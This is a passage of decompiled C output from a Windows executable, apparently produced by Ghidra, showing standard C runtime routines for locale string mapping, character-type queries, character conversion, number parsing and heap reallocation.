      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
      FUN_00415ce2();
      if (*(int *)(unaff_EBP + -0x20) != 0) {
        return SVar2;
      }
    }
    SVar2 = HeapSize(DAT_00423e74,0,lpMem);
  }
  return SVar2;
}



void FUN_00415ce2(void)

{
  FUN_0040df7b(4);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe

void __fastcall
FUN_00415ceb(int *param_1,uint param_2,LCID param_3,uint param_4,uint *param_5,int param_6,
            LPWSTR param_7,int param_8,UINT param_9,int param_10)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  uint *puVar5;
  int iVar6;
  uint cchWideChar;
  undefined4 *puVar7;
  UINT UVar8;
  undefined (*lpDestStr) [16];
  undefined4 extraout_ECX;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  uint extraout_EDX_03;
  uint extraout_EDX_04;
  uint extraout_EDX_05;
  undefined4 extraout_EDX_06;
  uint extraout_EDX_07;
  uint extraout_EDX_08;
  uint extraout_EDX_09;
  uint extraout_EDX_10;
  undefined8 uVar9;
  LPWSTR lpMultiByteStr;
  LPWSTR local_14;
  undefined4 *local_10;
  char *local_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (DAT_00424470 == 0) {
    iVar3 = LCMapStringW(0,0x100,(LPCWSTR)&DAT_0041cbd0,1,(LPWSTR)0x0,0);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      param_2 = extraout_EDX_00;
      if (DVar4 == 0x78) {
        DAT_00424470 = 2;
      }
    }
    else {
      DAT_00424470 = 1;
      param_2 = extraout_EDX;
    }
  }
  puVar5 = param_5;
  iVar3 = param_6;
  if (0 < param_6) {
    do {
      iVar3 = iVar3 + -1;
      if (*(char *)puVar5 == '\0') goto LAB_00415d5c;
      puVar5 = (uint *)((int)puVar5 + 1);
    } while (iVar3 != 0);
    iVar3 = -1;
LAB_00415d5c:
    iVar3 = param_6 - iVar3;
    iVar6 = iVar3 + -1;
    bVar2 = iVar6 < param_6;
    param_6 = iVar6;
    if (bVar2) {
      param_6 = iVar3;
    }
  }
  if ((DAT_00424470 == 2) || (DAT_00424470 == 0)) {
    local_10 = (undefined4 *)0x0;
    local_14 = (LPWSTR)0x0;
    if (param_3 == 0) {
      param_3 = *(LCID *)(*param_1 + 0x14);
    }
    if (param_9 == 0) {
      param_9 = *(UINT *)(*param_1 + 4);
    }
    uVar9 = FUN_00417230(param_3);
    param_2 = (uint)((ulonglong)uVar9 >> 0x20);
    UVar8 = (UINT)uVar9;
    if (UVar8 == 0xffffffff) goto LAB_0041607e;
    if (UVar8 == param_9) {
      LCMapStringA(param_3,param_4,(LPCSTR)param_5,param_6,(LPSTR)param_7,param_8);
      param_2 = extraout_EDX_08;
    }
    else {
      uVar9 = FUN_00417279(&param_6,param_2,param_9,UVar8,param_5,(char **)&param_6,(LPSTR)0x0,0);
      param_2 = (uint)((ulonglong)uVar9 >> 0x20);
      local_10 = (undefined4 *)uVar9;
      if (local_10 == (undefined4 *)0x0) goto LAB_0041607e;
      local_c = (char *)LCMapStringA(param_3,param_4,(LPCSTR)local_10,param_6,(LPSTR)0x0,0);
      param_2 = extraout_EDX_04;
      if (local_c != (char *)0x0) {
        if (((int)local_c < 1) || ((char *)0xffffffe0 < local_c)) {
          lpDestStr = (undefined (*) [16])0x0;
        }
        else if (local_c + 8 < (char *)0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_0041605b;
          lpDestStr = (undefined (*) [16])&stack0xffffffe4;
        }
        else {
          lpDestStr = (undefined (*) [16])FUN_0040afc0((uint)(local_c + 8));
          param_2 = extraout_EDX_05;
          if (lpDestStr != (undefined (*) [16])0x0) {
            *(undefined4 *)*lpDestStr = 0xdddd;
            lpDestStr = (undefined (*) [16])((int)*lpDestStr + 8);
          }
        }
        if (lpDestStr != (undefined (*) [16])0x0) {
          FUN_0040f8c0(lpDestStr,0,(uint)local_c);
          local_c = (char *)LCMapStringA(param_3,param_4,(LPCSTR)local_10,param_6,(LPSTR)lpDestStr,
                                         (int)local_c);
          if (local_c != (char *)0x0) {
            local_14 = (LPWSTR)FUN_00417279(extraout_ECX,extraout_EDX_06,UVar8,param_9,
                                            (uint *)lpDestStr,&local_c,(LPSTR)param_7,param_8);
          }
          FUN_0040beaf((int)lpDestStr);
          param_2 = extraout_EDX_07;
        }
      }
    }
LAB_0041605b:
    if (local_10 != (undefined4 *)0x0) {
      FUN_0040b61e();
      param_2 = extraout_EDX_09;
    }
    if ((local_14 != (LPWSTR)0x0) && (param_7 != local_14)) {
      FUN_0040b61e();
      param_2 = extraout_EDX_10;
    }
    goto LAB_0041607e;
  }
  if (DAT_00424470 != 1) goto LAB_0041607e;
  local_c = (char *)0x0;
  if (param_9 == 0) {
    param_9 = *(UINT *)(*param_1 + 4);
  }
  cchWideChar = MultiByteToWideChar(param_9,(uint)(param_10 != 0) * 8 + 1,(LPCSTR)param_5,param_6,
                                    (LPWSTR)0x0,0);
  param_2 = extraout_EDX_01;
  if (cchWideChar == 0) goto LAB_0041607e;
  if (((int)cchWideChar < 1) || (param_2 = 0xffffffe0 % cchWideChar, 0xffffffe0 / cchWideChar < 2))
  {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      puVar7 = (undefined4 *)&stack0xffffffdc;
      local_10 = (undefined4 *)&stack0xffffffdc;
      if (&stack0x00000000 != (undefined *)0x24) {
LAB_00415e04:
        local_10 = puVar7 + 2;
      }
    }
    else {
      puVar7 = (undefined4 *)FUN_0040afc0(uVar1);
      param_2 = extraout_EDX_02;
      local_10 = puVar7;
      if (puVar7 != (undefined4 *)0x0) {
        *puVar7 = 0xdddd;
        goto LAB_00415e04;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_0041607e;
  iVar3 = MultiByteToWideChar(param_9,1,(LPCSTR)param_5,param_6,(LPWSTR)local_10,cchWideChar);
  if ((iVar3 != 0) &&
     (local_c = (char *)LCMapStringW(param_3,param_4,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0),
     local_c != (char *)0x0)) {
    if ((param_4 & 0x400) == 0) {
      if (((int)local_c < 1) || (0xffffffe0U / (uint)local_c < 2)) {
        puVar7 = (undefined4 *)0x0;
      }
      else {
        uVar1 = (int)local_c * 2 + 8;
        if (uVar1 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_00415f14;
          puVar7 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar7 = (undefined4 *)FUN_0040afc0(uVar1);
          if (puVar7 != (undefined4 *)0x0) {
            *puVar7 = 0xdddd;
            puVar7 = puVar7 + 2;
          }
        }
      }
      if (puVar7 != (undefined4 *)0x0) {
        iVar3 = LCMapStringW(param_3,param_4,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar7,
                             (int)local_c);
        if (iVar3 != 0) {
          lpMultiByteStr = param_7;
          iVar3 = param_8;
          if (param_8 == 0) {
            lpMultiByteStr = (LPWSTR)0x0;
            iVar3 = 0;
          }
          local_c = (char *)WideCharToMultiByte(param_9,0,(LPCWSTR)puVar7,(int)local_c,
                                                (LPSTR)lpMultiByteStr,iVar3,(LPCSTR)0x0,(LPBOOL)0x0)
          ;
        }
        FUN_0040beaf((int)puVar7);
      }
    }
    else if ((param_8 != 0) && ((int)local_c <= param_8)) {
      LCMapStringW(param_3,param_4,(LPCWSTR)local_10,cchWideChar,param_7,param_8);
    }
  }
LAB_00415f14:
  FUN_0040beaf((int)local_10);
  param_2 = extraout_EDX_03;
LAB_0041607e:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,param_2);
  return;
}



void __cdecl
FUN_00416090(undefined (**param_1) [16],LCID param_2,uint param_3,uint *param_4,int param_5,
            LPWSTR param_6,int param_7,UINT param_8,int param_9)

{
  uint extraout_EDX;
  int local_14 [2];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,param_1);
  FUN_00415ceb(local_14,extraout_EDX,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9
              );
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe

void __fastcall
FUN_004160d5(int *param_1,undefined4 param_2,DWORD param_3,uint *param_4,int param_5,LPWORD param_6,
            UINT param_7,LCID param_8,int param_9)

{
  uint uVar1;
  BOOL BVar2;
  DWORD DVar3;
  uint cchWideChar;
  undefined (*pauVar4) [16];
  int cchSrc;
  UINT UVar5;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined (*lpWideCharStr) [16];
  uint *puVar6;
  undefined8 uVar7;
  int *local_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_c = param_1;
  if (DAT_00424474 == 0) {
    BVar2 = GetStringTypeW(1,(LPCWSTR)&DAT_0041cbd0,1,(LPWORD)&local_c);
    if (BVar2 == 0) {
      DVar3 = GetLastError();
      param_2 = extraout_EDX;
      if (DVar3 == 0x78) {
        DAT_00424474 = 2;
      }
      goto LAB_00416130;
    }
    DAT_00424474 = 1;
  }
  else {
LAB_00416130:
    if ((DAT_00424474 == 2) || (DAT_00424474 == 0)) {
      puVar6 = (uint *)0x0;
      if (param_8 == 0) {
        param_8 = *(LCID *)(*param_1 + 0x14);
      }
      if (param_7 == 0) {
        param_7 = *(UINT *)(*param_1 + 4);
      }
      uVar7 = FUN_00417230(param_8);
      param_2 = (undefined4)((ulonglong)uVar7 >> 0x20);
      UVar5 = (UINT)uVar7;
      if (UVar5 != 0xffffffff) {
        if (UVar5 != param_7) {
          uVar7 = FUN_00417279(&param_5,param_2,param_7,UVar5,param_4,(char **)&param_5,(LPSTR)0x0,0
                              );
          param_2 = (undefined4)((ulonglong)uVar7 >> 0x20);
          puVar6 = (uint *)uVar7;
          param_4 = puVar6;
          if (puVar6 == (uint *)0x0) goto LAB_0041627d;
        }
        GetStringTypeA(param_8,param_3,(LPCSTR)param_4,param_5,param_6);
        param_2 = extraout_EDX_03;
        if (puVar6 != (uint *)0x0) {
          FUN_0040b61e();
          param_2 = extraout_EDX_04;
        }
      }
      goto LAB_0041627d;
    }
    if (DAT_00424474 != 1) goto LAB_0041627d;
  }
  local_c = (int *)0x0;
  if (param_7 == 0) {
    param_7 = *(UINT *)(*param_1 + 4);
  }
  cchWideChar = MultiByteToWideChar(param_7,(uint)(param_9 != 0) * 8 + 1,(LPCSTR)param_4,param_5,
                                    (LPWSTR)0x0,0);
  param_2 = extraout_EDX_00;
  if (cchWideChar == 0) goto LAB_0041627d;
  lpWideCharStr = (undefined (*) [16])0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      pauVar4 = (undefined (*) [16])&stack0xffffffe8;
      lpWideCharStr = (undefined (*) [16])&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_004161c0:
        lpWideCharStr = (undefined (*) [16])(*pauVar4 + 8);
      }
    }
    else {
      pauVar4 = (undefined (*) [16])FUN_0040afc0(uVar1);
      param_2 = extraout_EDX_01;
      lpWideCharStr = pauVar4;
      if (pauVar4 != (undefined (*) [16])0x0) {
        *(undefined4 *)*pauVar4 = 0xdddd;
        goto LAB_004161c0;
      }
    }
  }
  if (lpWideCharStr != (undefined (*) [16])0x0) {
    FUN_0040f8c0(lpWideCharStr,0,cchWideChar * 2);
    cchSrc = MultiByteToWideChar(param_7,1,(LPCSTR)param_4,param_5,(LPWSTR)lpWideCharStr,cchWideChar
                                );
    if (cchSrc != 0) {
      local_c = (int *)GetStringTypeW(param_3,(LPCWSTR)lpWideCharStr,cchSrc,param_6);
    }
    FUN_0040beaf((int)lpWideCharStr);
    param_2 = extraout_EDX_02;
  }
LAB_0041627d:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,param_2);
  return;
}



void __cdecl
FUN_0041628f(undefined (**param_1) [16],DWORD param_2,uint *param_3,int param_4,LPWORD param_5,
            UINT param_6,LCID param_7,int param_8)

{
  undefined4 extraout_EDX;
  int local_14 [2];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,param_1);
  FUN_004160d5(local_14,extraout_EDX,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



void __cdecl FUN_004162d1(int param_1)

{
  if (param_1 != 0) {
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
    FUN_0040b61e();
  }
  return;
}



void __cdecl FUN_00416466(int *param_1)

{
  if (param_1 != (int *)0x0) {
    if (*param_1 != DAT_00422ef8) {
      FUN_0040b61e();
    }
    if (param_1[1] != DAT_00422efc) {
      FUN_0040b61e();
    }
    if (param_1[2] != DAT_00422f00) {
      FUN_0040b61e();
    }
  }
  return;
}



void __cdecl FUN_004164ab(int param_1)

{
  if (param_1 != 0) {
    if (*(int *)(param_1 + 0xc) != DAT_00422f04) {
      FUN_0040b61e();
    }
    if (*(int *)(param_1 + 0x10) != DAT_00422f08) {
      FUN_0040b61e();
    }
    if (*(int *)(param_1 + 0x14) != DAT_00422f0c) {
      FUN_0040b61e();
    }
    if (*(int *)(param_1 + 0x18) != DAT_00422f10) {
      FUN_0040b61e();
    }
    if (*(int *)(param_1 + 0x1c) != DAT_00422f14) {
      FUN_0040b61e();
    }
    if (*(int *)(param_1 + 0x20) != DAT_00422f18) {
      FUN_0040b61e();
    }
    if (*(int *)(param_1 + 0x24) != DAT_00422f1c) {
      FUN_0040b61e();
    }
  }
  return;
}



int __cdecl FUN_00416540(byte *param_1,byte *param_2)

{
  byte bVar1;
  byte *pbVar2;
  int iVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *param_2;
    if (bVar1 == 0) break;
    param_2 = param_2 + 1;
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  iVar3 = -1;
  do {
    iVar3 = iVar3 + 1;
    bVar1 = *param_1;
    if (bVar1 == 0) {
      return iVar3;
    }
    param_1 = param_1 + 1;
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return iVar3;
}



byte * __cdecl FUN_00416590(byte *param_1,byte *param_2)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *param_2;
    if (bVar1 == 0) break;
    param_2 = param_2 + 1;
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = param_1;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (byte *)(uint)bVar1;
    }
    param_1 = pbVar2 + 1;
  } while ((*(byte *)((int)&uStack_28 + ((int)(byte *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return pbVar2;
}



BOOL __cdecl
FUN_004165d0(undefined (**param_1) [16],DWORD param_2,LPCWSTR param_3,int param_4,LPWORD param_5)

{
  BOOL BVar1;
  undefined local_14 [8];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,param_1);
  if (param_4 < -1) {
    BVar1 = 0;
  }
  else {
    BVar1 = GetStringTypeW(param_2,param_3,param_4,param_5);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return BVar1;
}



undefined4 __cdecl
FUN_0041660e(int *param_1,undefined (*param_2) [16],uint param_3,WCHAR param_4,
            undefined (**param_5) [16])

{
  undefined (*lpMultiByteStr) [16];
  uint cbMultiByte;
  undefined4 uVar1;
  undefined4 *puVar2;
  int iVar3;
  DWORD DVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  cbMultiByte = param_3;
  lpMultiByteStr = param_2;
  if ((param_2 == (undefined (*) [16])0x0) && (param_3 != 0)) {
    if (param_1 != (int *)0x0) {
      *param_1 = 0;
    }
LAB_00416632:
    uVar1 = 0;
  }
  else {
    if (param_1 != (int *)0x0) {
      *param_1 = -1;
    }
    if (0x7fffffff < param_3) {
      puVar2 = (undefined4 *)FUN_0040caaa();
      *puVar2 = 0x16;
      FUN_0040ca42();
      return 0x16;
    }
    FUN_0040b970(local_14,param_5);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)param_4 < 0x100) {
        if (lpMultiByteStr != (undefined (*) [16])0x0) {
          if (cbMultiByte == 0) goto LAB_004166c9;
          (*lpMultiByteStr)[0] = (char)param_4;
        }
        if (param_1 != (int *)0x0) {
          *param_1 = 1;
        }
LAB_00416704:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_00416632;
      }
      if ((lpMultiByteStr != (undefined (*) [16])0x0) && (cbMultiByte != 0)) {
        FUN_0040f8c0(lpMultiByteStr,0,cbMultiByte);
      }
    }
    else {
      param_2 = (undefined (*) [16])0x0;
      iVar3 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&param_4,1,(LPSTR)lpMultiByteStr,
                                  cbMultiByte,(LPCSTR)0x0,(LPBOOL)&param_2);
      if (iVar3 == 0) {
        DVar4 = GetLastError();
        if (DVar4 == 0x7a) {
          if ((lpMultiByteStr != (undefined (*) [16])0x0) && (cbMultiByte != 0)) {
            FUN_0040f8c0(lpMultiByteStr,0,cbMultiByte);
          }
LAB_004166c9:
          puVar2 = (undefined4 *)FUN_0040caaa();
          *puVar2 = 0x22;
          FUN_0040ca42();
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (param_2 == (undefined (*) [16])0x0) {
        if (param_1 != (int *)0x0) {
          *param_1 = iVar3;
        }
        goto LAB_00416704;
      }
    }
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 0x2a;
    puVar2 = (undefined4 *)FUN_0040caaa();
    uVar1 = *puVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return uVar1;
}



void __cdecl FUN_0041677a(int *param_1,undefined (*param_2) [16],uint param_3,WCHAR param_4)

{
  FUN_0041660e(param_1,param_2,param_3,param_4,(undefined (**) [16])0x0);
  return;
}



uint __cdecl
FUN_00416797(undefined (**param_1) [16],byte *param_2,byte **param_3,uint param_4,uint param_5)

{
  byte *pbVar1;
  ushort uVar2;
  undefined4 *puVar3;
  undefined2 extraout_var;
  uint uVar4;
  undefined (*pauVar5) [16];
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  undefined (*local_18 [2]) [16];
  int local_10;
  char local_c;
  uint local_8;
  
  FUN_0040b970(local_18,param_1);
  if (param_3 != (byte **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (byte *)0x0) || ((param_4 != 0 && (((int)param_4 < 2 || (0x24 < (int)param_4))))))
  {
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0x16;
    FUN_0040ca42();
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  bVar8 = *param_2;
  local_8 = 0;
  pauVar5 = local_18[0];
  pbVar1 = param_2;
  while( true ) {
    pbVar9 = pbVar1 + 1;
    if (*(int *)(pauVar5[10] + 0xc) < 2) {
      uVar4 = *(ushort *)(*(int *)(pauVar5[0xc] + 8) + (uint)bVar8 * 2) & 8;
    }
    else {
      uVar2 = FUN_00417443((uint)bVar8,8,local_18);
      uVar4 = CONCAT22(extraout_var,uVar2);
      pauVar5 = local_18[0];
    }
    if (uVar4 == 0) break;
    bVar8 = *pbVar9;
    pbVar1 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_00416850:
    bVar8 = *pbVar9;
    pbVar9 = pbVar1 + 2;
  }
  else if (bVar8 == 0x2b) goto LAB_00416850;
  if ((((int)param_4 < 0) || (param_4 == 1)) || (0x24 < (int)param_4)) {
    if (param_3 != (byte **)0x0) {
      *param_3 = param_2;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_004168b6;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_004168b6;
    }
    param_4 = 0x10;
  }
  else if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_004168b6;
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_004168b6:
  uVar4 = (uint)(0xffffffff / (ulonglong)param_4);
  do {
    uVar2 = *(ushort *)(*(int *)(pauVar5[0xc] + 8) + (uint)bVar8 * 2);
    if ((uVar2 & 4) == 0) {
      if ((uVar2 & 0x103) == 0) {
LAB_00416913:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8) == 0) {
          if (param_3 != (byte **)0x0) {
            pbVar9 = param_2;
          }
          local_8 = 0;
        }
        else if (((param_5 & 4) != 0) ||
                (((param_5 & 1) == 0 &&
                 ((((param_5 & 2) != 0 && (0x80000000 < local_8)) ||
                  (((param_5 & 2) == 0 && (0x7fffffff < local_8)))))))) {
          puVar3 = (undefined4 *)FUN_0040caaa();
          *puVar3 = 0x22;
          if ((param_5 & 1) == 0) {
            local_8 = ((param_5 & 2) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_3 != (byte **)0x0) {
          *param_3 = pbVar9;
        }
        if ((param_5 & 2) != 0) {
          local_8 = -local_8;
        }
        if (local_c == '\0') {
          return local_8;
        }
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if (param_4 <= uVar6) goto LAB_00416913;
    if ((local_8 < uVar4) ||
       ((local_8 == uVar4 && (uVar6 <= (uint)(0xffffffff % (ulonglong)param_4))))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (byte **)0x0) goto LAB_00416913;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



void __cdecl FUN_004169c6(byte *param_1,byte **param_2,uint param_3)

{
  undefined (**ppauVar1) [16];
  
  if (DAT_004241e8 == 0) {
    ppauVar1 = (undefined (**) [16])&DAT_00422da0;
  }
  else {
    ppauVar1 = (undefined (**) [16])0x0;
  }
  FUN_00416797(ppauVar1,param_1,param_2,param_3,0);
  return;
}



int __cdecl FUN_004169f1(short *param_1)

{
  short sVar1;
  short *psVar2;
  
  psVar2 = param_1;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

LPVOID FUN_00416a0b(void)

{
  undefined4 *lpMem;
  LPVOID pvVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  DWORD DVar5;
  int unaff_EBP;
  uint *dwBytes;
  
  FUN_0040d634(&DAT_00420828,0x10);
  lpMem = *(undefined4 **)(unaff_EBP + 8);
  if (lpMem == (undefined4 *)0x0) {
    pvVar1 = FUN_0040afc0(*(uint *)(unaff_EBP + 0xc));
    return pvVar1;
  }
  dwBytes = *(uint **)(unaff_EBP + 0xc);
  if (dwBytes == (uint *)0x0) {
    FUN_0040b61e();
    return (LPVOID)0x0;
  }
  if (DAT_00425790 == 3) {
    do {
      *(undefined4 *)(unaff_EBP + -0x1c) = 0;
      if ((uint *)0xffffffe0 < dwBytes) goto LAB_00416be4;
      FUN_0040e055(4);
      *(undefined4 *)(unaff_EBP + -4) = 0;
      puVar2 = (uint *)FUN_0040e088((int)lpMem);
      *(uint **)(unaff_EBP + -0x20) = puVar2;
      if (puVar2 != (uint *)0x0) {
        if (dwBytes <= DAT_0042579c) {
          iVar3 = FUN_0040e586(puVar2,(int)lpMem,(int)dwBytes);
          if (iVar3 == 0) {
            piVar4 = FUN_0040e867(dwBytes);
            *(int **)(unaff_EBP + -0x1c) = piVar4;
            if (piVar4 != (int *)0x0) {
              puVar2 = (uint *)(lpMem[-1] - 1);
              if (dwBytes <= (uint *)(lpMem[-1] - 1)) {
                puVar2 = dwBytes;
              }
              FUN_00410450(*(undefined4 **)(unaff_EBP + -0x1c),lpMem,(uint)puVar2);
              puVar2 = (uint *)FUN_0040e088((int)lpMem);
              *(uint **)(unaff_EBP + -0x20) = puVar2;
              FUN_0040e0b8(puVar2,(int)lpMem);
            }
          }
          else {
            *(undefined4 **)(unaff_EBP + -0x1c) = lpMem;
          }
        }
        if (*(int *)(unaff_EBP + -0x1c) == 0) {
          if (dwBytes == (uint *)0x0) {
            dwBytes = (uint *)0x1;
            *(undefined4 *)(unaff_EBP + 0xc) = 1;
          }
          dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0);
          *(uint **)(unaff_EBP + 0xc) = dwBytes;
          pvVar1 = HeapAlloc(DAT_00423e74,0,(SIZE_T)dwBytes);
          *(LPVOID *)(unaff_EBP + -0x1c) = pvVar1;
          if (pvVar1 != (LPVOID)0x0) {
            puVar2 = (uint *)(lpMem[-1] - 1);
            if (dwBytes <= (uint *)(lpMem[-1] - 1)) {
              puVar2 = dwBytes;
            }
            FUN_00410450(*(undefined4 **)(unaff_EBP + -0x1c),lpMem,(uint)puVar2);
            FUN_0040e0b8(*(uint **)(unaff_EBP + -0x20),(int)lpMem);
          }
        }
      }
      *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
      FUN_00416b4f();
      if (*(int *)(unaff_EBP + -0x20) == 0) {
        if (dwBytes == (uint *)0x0) {
          dwBytes = (uint *)0x1;
        }
        dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0);
        *(uint **)(unaff_EBP + 0xc) = dwBytes;
        pvVar1 = HeapReAlloc(DAT_00423e74,0,lpMem,(SIZE_T)dwBytes);
      }
      else {
        pvVar1 = *(LPVOID *)(unaff_EBP + -0x1c);
      }
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (DAT_004241c8 == 0) {
        piVar4 = (int *)FUN_0040caaa();
        if (*(int *)(unaff_EBP + -0x20) != 0) {
          *piVar4 = 0xc;
          return (LPVOID)0x0;
        }
        goto LAB_00416c11;
      }
      iVar3 = FUN_0040f0a7(dwBytes);
    } while (iVar3 != 0);
    piVar4 = (int *)FUN_0040caaa();
    if (*(int *)(unaff_EBP + -0x20) != 0) goto LAB_00416bf0;
  }
  else {
    do {
      if ((uint *)0xffffffe0 < dwBytes) goto LAB_00416be4;
      if (dwBytes == (uint *)0x0) {
        dwBytes = (uint *)0x1;
      }
      pvVar1 = HeapReAlloc(DAT_00423e74,0,lpMem,(SIZE_T)dwBytes);
      if (pvVar1 != (LPVOID)0x0) {
        return pvVar1;
      }
      if (DAT_004241c8 == 0) {
